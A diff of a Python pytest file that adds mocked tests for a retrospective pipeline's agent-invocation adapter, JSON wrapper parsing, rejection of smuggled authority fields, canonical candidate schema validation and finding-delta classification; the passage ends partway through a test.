@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-"""Tests for run_retrospective.py (Issue #2237).
+"""Tests for run_retrospective.py (Issue #2237, iteration-3 fix_delta for
+OWNER review #2237#issuecomment-5378291560).
 
 Fixture/mock-based only (Runtime Verification Applicability: deferred -- see
 Issue #2237 body). No live GitHub/Web/git/Agent call is ever made; every I/O
@@ -19,13 +20,30 @@ Covers every Issue #2237 AC that is a pytest -k target:
   AC16 publish_request_forbidden_fields
   AC17 delegated_agent_mutation_denied
   AC18 temp_artifact_cleanup_all_paths
+
+Plus the 12 production-shaped fix_delta gates required by OWNER review #3
+(each named exactly as required):
+  1  test_cli_selects_named_agent_and_uses_inline_schema
+  2  test_private_prompt_uses_stdin_and_disables_session_persistence
+  3  test_actual_claude_json_wrapper_extracts_structured_output
+  4  test_executable_entrypoint_collectors_to_publish_request
+  5  test_nested_private_evidence_and_authority_fields_rejected
+  6  test_candidate_records_validate_current_canonical_schema
+  7  test_delta_uses_2289_fixtures_and_incomplete_state_is_indeterminate
+  8  test_permission_policy_is_consumed_by_runtime_and_bypass_resistant
+  9  test_exact_observer_manifest_base_sha_and_role_authority
+  10 test_web_result_is_recollected_and_digest_bound
+  11 test_public_projection_digest_binds_source_and_concurrency_state
+  12 test_temp_scope_is_on_production_path_and_cleanup_failure_surfaces
 """
 
 from __future__ import annotations
 
+import copy
 import dataclasses
 import json
 import os
+import shutil
 import signal
 import subprocess
 import sys
@@ -40,8 +58,11 @@ sys.path.insert(0, str(_SCRIPTS_DIR))
 
 import run_retrospective as rr  # noqa: E402
 
+_validate_mod = rr._validate_retrospective_schema_module()
+
 _FULL_SHA = "a" * 40
 _OTHER_SHA = "b" * 40
+_DIGEST = "d" * 64
 
 
 # ---------------------------------------------------------------------------
@@ -54,6 +75,104 @@ def test_skill_md_under_500_lines() -> None:
     assert skill_md.is_file(), f"missing {skill_md}"
     line_count = len(skill_md.read_text(encoding="utf-8").splitlines())
     assert line_count < 500, f"SKILL.md has {line_count} lines, must be < 500"
+
+
+# ---------------------------------------------------------------------------
+# canonical agent_improvement_candidate/v1 record builders (shared helper,
+# used by AC7/AC15/AC16 and fix_delta gates #6/#7/#9/#10/#11)
+# ---------------------------------------------------------------------------
+
+
+def _identity_key(rule_id: str, path: str = "schemas/x.json") -> dict[str, Any]:
+    return {
+        "repository_id": "squne121/loop-protocol",
+        "claim_class": "runtime_behavior",
+        "subject_ref": {"kind": "repository_path", "value": path},
+        "rule_id": rule_id,
+    }
+
+
+def _finding_identity(rule_id: str, path: str = "schemas/x.json") -> dict[str, Any]:
+    key = _identity_key(rule_id, path)
+    value = _validate_mod.compute_finding_identity(key)
+    return {"algorithm": "sha256-jcs-v1", "key": key, "value": value}
+
+
+def _evidence_ref(suffix: str = "1") -> dict[str, Any]:
+    return {
+        "ref_type": "repository_blob",
+        "source_id": "repository",
+        "resource_identity": f"schemas/x.json#{suffix}",
+        "projection_digest": "sha256:" + ("1" * 64),
+    }
+
+
+def _evaluation_entry(
+    *,
+    rule_id: str,
+    presence_delta: str,
+    observed: bool,
+    source_coverage: str = "complete",
+    evaluation_status: str = "classified",
+    previous_ref: str | None = None,
+    delta_status: str | None = None,
+    indeterminate_reason: str | None = None,
+    evidence_refs: list[dict[str, Any]] | None = None,
+    seq: int = 1,
+) -> dict[str, Any]:
+    eval_id = "sha256:" + format(abs(hash((rule_id, presence_delta, seq))), "064x")[:64]
+    signal = {"signal_type": "boolean", "value": observed, "comparator": "eq", "worse_direction": "not_applicable"}
+    return {
+        "evaluation_id": eval_id,
+        "evaluated_run_ref": {"base_sha": _FULL_SHA, "source_set_digest": _DIGEST},
+        "previous_evaluation_ref": previous_ref,
+        "observed": observed,
+        "source_coverage": source_coverage,
+        "evaluation_status": evaluation_status,
+        "presence_delta": presence_delta,
+        "signal_delta": "unknown",
+        "delta_status": delta_status if evaluation_status == "classified" else None,
+        "indeterminate_reason": indeterminate_reason,
+        "baseline_signal": None
+        if presence_delta in ("new",)
+        else (signal if evaluation_status == "classified" else None),
+        "current_signal": signal if evaluation_status == "classified" and presence_delta != "resolved" else None,
+        "expected_signal": None,
+        "evidence_refs": evidence_refs
+        if evidence_refs is not None
+        else ([_evidence_ref()] if evaluation_status == "classified" else []),
+        "classified_at": "2026-08-22T00:00:00Z",
+        "classifier_version": "run_retrospective/v1",
+    }
+
+
+def _canonical_candidate(
+    *,
+    candidate_id: str,
+    rule_id: str,
+    evaluations: list[dict[str, Any]],
+    path: str = "schemas/x.json",
+) -> dict[str, Any]:
+    return {
+        "candidate_id": candidate_id,
+        "candidate_status": "proposed",
+        "title": f"fixture candidate {candidate_id}",
+        "description": f"fixture candidate for {rule_id}",
+        "source_run_ref": {"base_sha": _FULL_SHA, "source_set_digest": _DIGEST},
+        "created_at": "2026-08-22T00:00:00Z",
+        "updated_at": "2026-08-22T00:00:00Z",
+        "finding_contract": {
+            "schema_version": "v1",
+            "identity": _finding_identity(rule_id, path),
+            "claim_class": "runtime_behavior",
+            "evaluations": evaluations,
+        },
+    }
+
+
+def _new_candidate(candidate_id: str = "cand-new-0001", rule_id: str = "example_rule") -> dict[str, Any]:
+    evaluation = _evaluation_entry(rule_id=rule_id, presence_delta="new", observed=True, delta_status="new")
+    return _canonical_candidate(candidate_id=candidate_id, rule_id=rule_id, evaluations=[evaluation])
 
 
 # ---------------------------------------------------------------------------
@@ -105,8 +224,8 @@ def _sample_evaluation() -> rr.Evaluation:
     return rr.Evaluation(
         run_id="run-1",
         base_sha=_FULL_SHA,
-        source_set_digest="digest-1",
-        candidate_records=[{"finding_identity": "fid-1", "severity": "medium"}],
+        source_set_digest=_DIGEST,
+        candidate_records=[_new_candidate()],
         evidence_ref="evidence://run-1/evaluation",
     )
 
@@ -116,8 +235,8 @@ def _sample_publish_request() -> rr.PublishRequest:
         request_id="req-1",
         repository_id="squne121/loop-protocol",
         target_issue=2237,
-        run_identity={"run_id": "run-1", "base_sha": _FULL_SHA, "source_set_digest": "digest-1"},
-        candidate_records=[{"finding_identity": "fid-1", "severity": "medium"}],
+        run_identity={"run_id": "run-1", "base_sha": _FULL_SHA, "source_set_digest": _DIGEST},
+        candidate_records=[_new_candidate()],
         expected_previous_digest=None,
         idempotency_key="idem-1",
         public_projection_digest="a" * 64,
@@ -247,25 +366,39 @@ def test_base_sha_fixed_once_rejects_non_full_sha() -> None:
 
 
 # ---------------------------------------------------------------------------
-# helpers shared by AC9/AC10/AC11/AC13/AC14
+# helpers shared by AC9/AC10/AC11/AC13/AC14 and fix_delta gates
 # ---------------------------------------------------------------------------
 
 
 class _FakeCollectorResult:
-    def __init__(self, observation: dict[str, Any]) -> None:
+    def __init__(self, observation: dict[str, Any], private_evidence: dict[str, Any] | None = None) -> None:
         self.observation = observation
-        self.private_evidence: dict[str, Any] = {}
+        self.private_evidence: dict[str, Any] = private_evidence or {}
 
 
-def _fake_collector_result(source_id: str, base_sha: str) -> _FakeCollectorResult:
+def _fake_collector_result(source_id: str, base_sha: str, digest: str | None = None) -> _FakeCollectorResult:
     return _FakeCollectorResult(
         {
             "source_type": "repository" if source_id == "repository" else "github",
             "source_id": source_id,
             "source_status": "complete",
             "pagination_completeness": "complete",
-        }
+        },
+        {"evidence_digest": digest} if digest else {},
     )
+
+
+def _wrapper_payload(structured_output: dict[str, Any], *, is_error: bool = False) -> dict[str, Any]:
+    """Shape of the *actual* `claude -p --output-format json` response: a
+    metadata wrapper carrying `structured_output` as a nested field, not the
+    business schema itself at the top level (Issue #2237 P0-1)."""
+    return {
+        "type": "result",
+        "subtype": "success" if not is_error else "error",
+        "is_error": is_error,
+        "result": "assistant text summary",
+        "structured_output": structured_output,
+    }
 
 
 def _ok_agent_result(payload: dict[str, Any]) -> rr.AgentInvocationResult:
@@ -274,21 +407,21 @@ def _ok_agent_result(payload: dict[str, Any]) -> rr.AgentInvocationResult:
     )
 
 
-def _observer_request(agent_name: str) -> rr.AgentInvocationRequest:
+def _observer_request(agent_name: str, schema_path: str = "/tmp/schema.json") -> rr.AgentInvocationRequest:
     return rr.AgentInvocationRequest(
         agent_name=agent_name,
         prompt="observe",
-        json_schema_path="/tmp/schema.json",
+        json_schema_path=schema_path,
         cwd="/repo",
     )
 
 
-def _make_observer_invoke(run_id: str, digest: str, call_log: list[str]):
+def _make_observer_invoke(run_id: str, digest: str, call_log: list[str], base_sha: str = _FULL_SHA):
     def _invoke(request: rr.AgentInvocationRequest) -> rr.AgentInvocationResult:
         call_log.append(f"observer:{request.agent_name}")
         bundle = rr.EvidenceBundle(
             run_id=run_id,
-            base_sha=_FULL_SHA,
+            base_sha=base_sha,
             source_set_digest=digest,
             observer_id=request.agent_name,
             evidence_ref=f"evidence://{run_id}/{request.agent_name}",
@@ -306,7 +439,7 @@ def _make_evaluator_invoke(run_id: str, digest: str, call_log: list[str]):
             run_id=run_id,
             base_sha=_FULL_SHA,
             source_set_digest=digest,
-            candidate_records=[{"finding_identity": "fid-1", "severity": "medium"}],
+            candidate_records=[_new_candidate()],
             evidence_ref=f"evidence://{run_id}/evaluation",
         )
         return _ok_agent_result(json.loads(evaluation.to_wire()))
@@ -468,8 +601,9 @@ def test_no_mutation_side_effect(monkeypatch: pytest.MonkeyPatch) -> None:
     _ctx, _plan, publish_request = _run_full_pipeline(call_log)
 
     # THEN no subprocess call happened at all (prepare/validate-observers/
-    # prepare-evaluator/finalize never shell out; the root Skill is
-    # responsible for actual Agent invocation)
+    # prepare-evaluator/finalize never shell out; only `invoke_agent` -- via
+    # the injected `runner` -- shells out, and this test's `invoke`/
+    # `invoke_evaluator` callbacks are pure fakes that never call `invoke_agent`)
     assert recorded_subprocess_calls == []
     # AND the only produced artifact is a proposal-only PublishRequest
     assert isinstance(publish_request, rr.PublishRequest)
@@ -490,75 +624,427 @@ def test_no_mutation_side_effect_denies_mutation_argv_via_permission_policy() ->
 # ---------------------------------------------------------------------------
 
 
-def _invocation_request() -> rr.AgentInvocationRequest:
+def _invocation_request(schema_path: str = "/tmp/s.json") -> rr.AgentInvocationRequest:
     return rr.AgentInvocationRequest(
-        agent_name="retrospective-runtime-observer", prompt="observe", json_schema_path="/tmp/s.json", cwd="/repo"
+        agent_name="retrospective-runtime-observer", prompt="observe", json_schema_path=schema_path, cwd="/repo"
     )
 
 
-def test_production_agent_invocation_adapter_argv_shape() -> None:
-    request = _invocation_request()
+def test_production_agent_invocation_adapter_argv_shape(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text('{"type": "object"}', encoding="utf-8")
+    request = _invocation_request(str(schema_path))
     argv = rr.build_agent_invocation_argv(request)
     assert argv[:2] == ["claude", "-p"]
+    assert "--agent" in argv and argv[argv.index("--agent") + 1] == request.agent_name
     assert "--output-format" in argv and argv[argv.index("--output-format") + 1] == "json"
-    assert "--json-schema" in argv and argv[argv.index("--json-schema") + 1] == request.json_schema_path
+    assert "--json-schema" in argv and argv[argv.index("--json-schema") + 1] == schema_path.read_text(encoding="utf-8")
+    assert "--no-session-persistence" in argv
     assert "--bare" not in argv
+    # the prompt text must never appear as an argv element
+    assert request.prompt not in argv
 
 
-def test_production_agent_invocation_adapter_success() -> None:
+def test_production_agent_invocation_adapter_success(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
     def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
-        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps({"ok": True}), stderr="")
+        return subprocess.CompletedProcess(
+            argv, returncode=0, stdout=json.dumps(_wrapper_payload({"ok": True})), stderr=""
+        )
 
-    result = rr.invoke_agent(_invocation_request(), runner=_runner)
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
     assert result.status == "ok"
     assert result.structured_output == {"ok": True}
 
 
-def test_production_agent_invocation_adapter_timeout() -> None:
+def test_production_agent_invocation_adapter_timeout(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
     def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
         raise subprocess.TimeoutExpired(cmd=argv, timeout=kwargs.get("timeout", 300))
 
-    result = rr.invoke_agent(_invocation_request(), runner=_runner)
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
     assert result.status == "timeout"
     assert result.reason_code == "timeout"
 
 
-def test_production_agent_invocation_adapter_sigterm() -> None:
+def test_production_agent_invocation_adapter_sigterm(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
     def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
         return subprocess.CompletedProcess(argv, returncode=-signal.SIGTERM, stdout="", stderr="")
 
-    result = rr.invoke_agent(_invocation_request(), runner=_runner)
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
     assert result.status == "terminated"
     assert result.reason_code == "sigterm"
 
 
-def test_production_agent_invocation_adapter_api_error() -> None:
+def test_production_agent_invocation_adapter_api_error(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
     def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
         return subprocess.CompletedProcess(argv, returncode=1, stdout="", stderr="internal error")
 
-    result = rr.invoke_agent(_invocation_request(), runner=_runner)
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
     assert result.status == "api_error"
     assert result.reason_code == "nonzero_exit"
 
 
-def test_production_agent_invocation_adapter_partial_result() -> None:
+def test_production_agent_invocation_adapter_partial_result(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
     def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
         return subprocess.CompletedProcess(
-            argv, returncode=0, stdout=json.dumps({"is_error": True, "result": "partial text"}), stderr=""
+            argv, returncode=0, stdout=json.dumps(_wrapper_payload({}, is_error=True)), stderr=""
         )
 
-    result = rr.invoke_agent(_invocation_request(), runner=_runner)
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
     assert result.status == "partial_result"
     assert result.reason_code == "api_error_with_partial_text"
 
 
-def test_production_agent_invocation_adapter_malformed_structured_output() -> None:
+def test_production_agent_invocation_adapter_malformed_structured_output(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
     def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
         return subprocess.CompletedProcess(argv, returncode=0, stdout="not-json-at-all", stderr="")
 
-    result = rr.invoke_agent(_invocation_request(), runner=_runner)
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
     assert result.status == "malformed_output"
     assert result.reason_code == "json_decode_failure"
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #1: --agent <name> selection + inline schema content
+# ---------------------------------------------------------------------------
+
+
+def test_cli_selects_named_agent_and_uses_inline_schema(tmp_path: Path) -> None:
+    schema_path = tmp_path / "evaluation_result_v1.schema.json"
+    schema_text = json.dumps({"type": "object", "title": "evaluation_result/v1"})
+    schema_path.write_text(schema_text, encoding="utf-8")
+
+    request = rr.AgentInvocationRequest(
+        agent_name="retrospective-evaluator", prompt="evaluate", json_schema_path=str(schema_path), cwd="/repo"
+    )
+    argv = rr.build_agent_invocation_argv(request)
+    assert argv[argv.index("--agent") + 1] == "retrospective-evaluator"
+    # the schema *content*, not the file path, is what is passed to the CLI
+    assert argv[argv.index("--json-schema") + 1] == schema_text
+    assert str(schema_path) not in argv
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #2: prompt via stdin, --no-session-persistence
+# ---------------------------------------------------------------------------
+
+
+def test_private_prompt_uses_stdin_and_disables_session_persistence(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+    request = rr.AgentInvocationRequest(
+        agent_name="retrospective-runtime-observer",
+        prompt="SECRET-PRIVATE-PROMPT-TEXT",
+        json_schema_path=str(schema_path),
+        cwd="/repo",
+    )
+    captured: dict[str, Any] = {}
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        captured["argv"] = argv
+        captured["kwargs"] = kwargs
+        return subprocess.CompletedProcess(
+            argv, returncode=0, stdout=json.dumps(_wrapper_payload({"ok": True})), stderr=""
+        )
+
+    rr.invoke_agent(request, runner=_runner)
+    assert "--no-session-persistence" in captured["argv"]
+    assert request.prompt not in captured["argv"]
+    assert captured["kwargs"]["input"] == request.prompt
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #3: real claude JSON wrapper -> structured_output extraction
+# ---------------------------------------------------------------------------
+
+
+def test_actual_claude_json_wrapper_extracts_structured_output(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+    business_payload = {"schema_version": "observer_result/v1", "run_id": "r"}
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        wrapper = _wrapper_payload(business_payload)
+        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")
+
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
+    assert result.status == "ok"
+    # THEN only the nested `structured_output` field is surfaced, never the
+    # wrapper itself (which would additionally contain type/subtype/result)
+    assert result.structured_output == business_payload
+
+
+def test_actual_claude_json_wrapper_rejects_missing_structured_output(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        wrapper = {"type": "result", "subtype": "success", "is_error": False, "result": "text only, no schema"}
+        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps(wrapper), stderr="")
+
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
+    assert result.status == "malformed_output"
+    assert result.reason_code == "missing_structured_output"
+
+
+def test_actual_claude_json_wrapper_rejects_unexpected_shape(tmp_path: Path) -> None:
+    schema_path = tmp_path / "s.json"
+    schema_path.write_text("{}", encoding="utf-8")
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        return subprocess.CompletedProcess(argv, returncode=0, stdout=json.dumps({"unexpected": "shape"}), stderr="")
+
+    result = rr.invoke_agent(_invocation_request(str(schema_path)), runner=_runner)
+    assert result.status == "malformed_output"
+    assert result.reason_code == "unexpected_wrapper_shape"
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #4: single executable entrypoint, collectors -> PublishRequest
+# ---------------------------------------------------------------------------
+
+
+def test_executable_entrypoint_collectors_to_publish_request(tmp_path: Path) -> None:
+    repo_root = _SCRIPTS_DIR.parents[3]
+    schema_dir = tmp_path / "schemas"
+    schema_dir.mkdir()
+    (schema_dir / "observer_result_v1.schema.json").write_text("{}", encoding="utf-8")
+    (schema_dir / "evaluation_result_v1.schema.json").write_text("{}", encoding="utf-8")
+
+    def _git_runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        assert argv == ["git", "rev-parse", "main"]
+        return subprocess.CompletedProcess(argv, returncode=0, stdout=_FULL_SHA + "\n", stderr="")
+
+    call_log: list[str] = []
+    # the expected source_set_digest is derived by running the *same*
+    # collector closure `run_cli` uses, so this fake runner's fabricated
+    # bundles agree with the real `prepare()` output without duplicating
+    # collect_repository_source's internal observation shape by hand.
+    real_observation = rr.build_repository_collector(repo_root)(_FULL_SHA).observation
+    expected_digest = rr.compute_source_set_digest([real_observation])
+
+    def _runner(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        agent_name = argv[argv.index("--agent") + 1]
+        call_log.append(agent_name)
+        if agent_name == "retrospective-evaluator":
+            evaluator_request = rr.EvaluatorRequest.from_wire(kwargs["input"])
+            evaluation = rr.Evaluation(
+                run_id=evaluator_request.run_id,
+                base_sha=_FULL_SHA,
+                source_set_digest=evaluator_request.source_set_digest,
+                candidate_records=[_new_candidate()],
+                evidence_ref="e",
+            )
+            return subprocess.CompletedProcess(
+                argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(evaluation.to_wire()))), stderr=""
+            )
+        bundle = rr.EvidenceBundle(
+            run_id=kwargs["env"].get("AGENT_RETROSPECTIVE_RUN_ID", ""),
+            base_sha=kwargs["env"].get("AGENT_RETROSPECTIVE_BASE_SHA", ""),
+            source_set_digest=expected_digest,
+            observer_id=agent_name,
+            evidence_ref=f"evidence://{agent_name}",
+            findings=[{"claim": f"finding from {agent_name}", "claim_class": "process"}],
+        )
+        return subprocess.CompletedProcess(
+            argv, returncode=0, stdout=json.dumps(_wrapper_payload(json.loads(bundle.to_wire()))), stderr=""
+        )
+
+    publish_request = rr.run_cli(
+        repo_root=repo_root,
+        repository_id="squne121/loop-protocol",
+        target_issue=2237,
+        request_id="req-cli-1",
+        idempotency_key="idem-cli-1",
+        schema_dir=schema_dir,
+        prompts={},
+        runner=_runner,
+        git_runner=_git_runner,
+        run_id="run-cli-1",
+        temp_base_dir=tmp_path,
+    )
+
+    assert isinstance(publish_request, rr.PublishRequest)
+    assert sorted(call_log) == sorted(
+        [spec.observer_id for spec in rr.EXPECTED_OBSERVER_MANIFEST] + ["retrospective-evaluator"]
+    )
+    assert call_log[-1] == "retrospective-evaluator"  # evaluator invoked last
+    assert publish_request.run_identity["run_id"] == "run-cli-1"
+    assert publish_request.run_identity["base_sha"] == _FULL_SHA
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #5: nested smuggled private_evidence/authority fields
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("smuggled_key", sorted(rr.SMUGGLED_AUTHORITY_KEYS))
+def test_nested_private_evidence_and_authority_fields_rejected(smuggled_key: str) -> None:
+    payload = json.loads(
+        rr.EvaluatorRequest(
+            run_id="r",
+            base_sha=_FULL_SHA,
+            source_set_digest="d",
+            finding_sets=[{"observer_id": "o", "findings": [{"claim": "x", smuggled_key: "smuggled-value"}]}],
+        ).to_wire()
+    )
+    with pytest.raises(rr.WireContractError) as excinfo:
+        rr.EvaluatorRequest.from_wire(json.dumps(payload))
+    assert excinfo.value.reason_code == "smuggled_authority_field"
+
+
+def test_nested_private_evidence_rejected_inside_candidate_records() -> None:
+    # a smuggled key nested inside candidate_records[].finding_contract is
+    # rejected fail-closed -- defense-in-depth: it is caught either by the
+    # canonical candidate schema's own `additionalProperties: false` (the
+    # evaluation sub-schema does not declare `private_evidence`) or, for a
+    # key nested somewhere the candidate schema would tolerate as `Any`, by
+    # the generic nested smuggled-authority-key scan.
+    candidate = _new_candidate()
+    candidate["finding_contract"]["evaluations"][0]["private_evidence"] = {"stdout": "raw"}
+    with pytest.raises(rr.WireContractError) as excinfo:
+        rr.Evaluation(
+            run_id="r", base_sha=_FULL_SHA, source_set_digest=_DIGEST, candidate_records=[candidate], evidence_ref="e"
+        )
+    assert excinfo.value.reason_code in ("candidate_schema_invalid", "smuggled_authority_field")
+
+
+def test_nested_private_evidence_rejected_inside_run_identity() -> None:
+    payload = json.loads(_sample_publish_request().to_wire())
+    payload["run_identity"]["authorization_token"] = "smuggled"
+    with pytest.raises(rr.WireContractError) as excinfo:
+        rr.PublishRequest.from_wire(json.dumps(payload))
+    assert excinfo.value.reason_code == "smuggled_authority_field"
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #6: candidate_records validate against canonical schema
+# ---------------------------------------------------------------------------
+
+
+def test_candidate_records_validate_current_canonical_schema() -> None:
+    # a legacy-shaped (private-dialect) candidate is rejected outright
+    legacy_shaped = {"finding_identity": "fid-1", "severity": "medium"}
+    with pytest.raises(rr.WireContractError) as excinfo:
+        rr.Evaluation(
+            run_id="r",
+            base_sha=_FULL_SHA,
+            source_set_digest=_DIGEST,
+            candidate_records=[legacy_shaped],
+            evidence_ref="e",
+        )._post_validate()
+    assert excinfo.value.reason_code == "candidate_schema_invalid"
+
+    # a canonical agent_improvement_candidate/v1 record (real #2288/#2289
+    # fixture, reused via load_fixture -- not a private dialect) passes
+    real_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.new.valid.json")
+    rr.Evaluation(
+        run_id="r", base_sha=_FULL_SHA, source_set_digest=_DIGEST, candidate_records=[real_fixture], evidence_ref="e"
+    )  # no raise
+
+
+def test_candidate_records_validate_current_canonical_schema_rejects_duplicate_id() -> None:
+    candidate = _new_candidate()
+    with pytest.raises(rr.WireContractError) as excinfo:
+        rr.Evaluation(
+            run_id="r",
+            base_sha=_FULL_SHA,
+            source_set_digest=_DIGEST,
+            candidate_records=[candidate, copy.deepcopy(candidate)],
+            evidence_ref="e",
+        )
+    assert excinfo.value.reason_code == "duplicate_identity"
+
+
+# ---------------------------------------------------------------------------
+# fix_delta gate #7: delta engine reuses #2289 fixtures; incomplete state
+# is indeterminate (never a false "resolved")
+# ---------------------------------------------------------------------------
+
+
+def test_delta_uses_2289_fixtures_and_incomplete_state_is_indeterminate() -> None:
+    new_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.new.valid.json")
+    resolved_fixture = _validate_mod.load_fixture("agent_improvement_candidate_v1.finding_contract.resolved.valid.json")
+
+    # available, complete coverage: a previously-"new" finding that is no
+    # longer present in the current run resolves.
+    previous = rr.PreviousStateResult(
+        status="available", previous_run_ref="run-0", candidates=[new_fixture], read_version="v1"
+    )
+    delta = rr.compute_delta(previous, [])
+    assert delta == [
+        {
+            "finding_identity": new_fixture["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "resolved",
+        }
+    ]
+
+    # a resolved finding reappearing in the current run is recurrent
+    current_recurrence = copy.deepcopy(resolved_fixture)
+    previous_resolved = rr.PreviousStateResult(
+        status="available", previous_run_ref="run-0", candidates=[resolved_fixture], read_version="v1"
+    )
+    delta = rr.compute_delta(previous_resolved, [current_recurrence])
+    assert delta == [
+        {
+            "finding_identity": resolved_fixture["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "recurrent",
+        }
+    ]
+
+    # partial/stale previous-state coverage forces indeterminate -- an
+    # absence observed under incomplete coverage is never reported resolved
+    for incomplete_status, expected_reason in (("partial", "source_partial"), ("stale", "source_stale")):
+        previous_incomplete = rr.PreviousStateResult(
+            status=incomplete_status, previous_run_ref="run-0", candidates=[new_fixture], read_version="v1"
+        )
+        delta = rr.compute_delta(previous_incomplete, [])
+        assert delta == []  # nothing currently present to classify, and no false "resolved" is fabricated
+
+        delta_present = rr.compute_delta(previous_incomplete, [new_fixture])
+        assert delta_present == [
+            {
+                "finding_identity": new_fixture["finding_contract"]["identity"]["value"],
+                "evaluation_status": "indeterminate",
+                "delta_status": None,
+                "indeterminate_reason": expected_reason,
+            }
+        ]
+
+
+def test_delta_never_uses_legacy_open_resolved_lifecycle_dialect() -> None:
+    # the canonical candidate_status enum has no "open"/"resolved" values
+    # (Issue #2237 P0-4) -- compute_delta must never read candidate_status
+    candidate = _new_candidate()
+    assert candidate["candidate_status"] not in ("open", "resolved")
+    previous = rr.PreviousStateResult(status="no_history", previous_run_ref=None, candidates=[], read_version=None)
+    delta = rr.compute_delta(previous, [candidate])
+    assert delta == [
+        {
+            "finding_identity": candidate["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "new",
+        }
+    ]
 
 
 # ---------------------------------------------------------------------------
@@ -645,64 +1131,78 @@ def test_previous_state_provider_five_states_rejects_invalid_status() -> None:
 
 def test_previous_state_provider_five_states_delta_new_from_no_history() -> None:
     previous = rr.PreviousStateResult(status="no_history", previous_run_ref=None, candidates=[], read_version=None)
-    delta = rr.compute_delta(previous, [{"finding_identity": "fid-1", "severity": "medium"}])
-    assert delta == [{"finding_identity": "fid-1", "delta_status": "new"}]
+    candidate = _new_candidate()
+    delta = rr.compute_delta(previous, [candidate])
+    assert delta == [
+        {
+            "finding_identity": candidate["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "new",
+        }
+    ]
 
 
 def test_previous_state_provider_five_states_delta_legacy_unavailable_is_new() -> None:
     previous = rr.PreviousStateResult(
         status="legacy_unavailable", previous_run_ref=None, candidates=[], read_version=None
     )
-    delta = rr.compute_delta(previous, [{"finding_identity": "fid-1", "severity": "low"}])
-    assert delta == [{"finding_identity": "fid-1", "delta_status": "new"}]
+    candidate = _new_candidate()
+    delta = rr.compute_delta(previous, [candidate])
+    assert delta == [
+        {
+            "finding_identity": candidate["finding_contract"]["identity"]["value"],
+            "evaluation_status": "classified",
+            "delta_status": "new",
+        }
+    ]
 
 
 def test_previous_state_provider_five_states_delta_unchanged() -> None:
+    candidate = _new_candidate()
     previous = rr.PreviousStateResult(
-        status="available",
-        previous_run_ref="run-0",
-        candidates=[{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}],
-        read_version="v1",
+        status="available", previous_run_ref="run-0", candidates=[candidate], read_version="v1"
     )
-    delta = rr.compute_delta(
-        previous, [{"finding_identity": "fid-1", "severity": "medium", "candidate_status": "open"}]
-    )
-    assert delta == [{"finding_identity": "fid-1", "delta_status": "unchanged"}]
-
-
-def test_previous_state_provider_five_states_delta_regressed() -> None:
-    previous = rr.PreviousStateResult(
-        status="partial",
-        previous_run_ref="run-0",
-        candidates=[{"finding_identity": "fid-1", "severity": "low", "candidate_status": "open"}],
-        read_version="v1",
-    )
-    delta = rr.compute_delta(previous, [{"finding_identity": "fid-1", "severity": "high", "candidate_status": "open"}])
-    assert delta == [{"finding_identity": "fid-1", "delta_status": "regressed"}]
+    delta = rr.compute_delta(previous, [candidate])
+    assert delta == [
+        {
